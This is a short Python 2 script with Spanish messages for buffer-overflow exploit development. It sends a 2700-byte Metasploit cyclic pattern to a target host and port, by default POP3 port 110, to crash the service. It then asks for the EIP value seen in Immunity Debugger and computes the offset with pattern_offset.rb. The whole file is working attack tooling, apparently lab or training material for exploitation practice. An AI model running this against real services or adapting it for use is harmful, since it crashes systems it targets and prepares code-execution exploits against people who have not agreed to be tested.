import sys,socket
import subprocess
from time import sleep
puerto = 110
try:
    host = str(sys.argv[1])
    puerto = str(sys.argv[2])
except IndexError:
    print "USO : python %s <direccion_IP> <puerto>" %sys.argv[0]
    sys.exit()
msfpattern = "/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 2700"
buffer = subprocess.check_output(msfpattern, shell=True)
try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((host,int(puerto)))
    s.send(buffer)
    s.close()
except:
    print ("Algo ha ido mal...")
    sys.exit()
memoryoffset = input("Introduce la direccion de memoria del EIP en el immunity debugger despues del crash...: ")
print "El offset es... "
msfoffset = "/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb -q {}".format(memoryoffset)
print(subprocess.check_output(msfoffset, shell=True))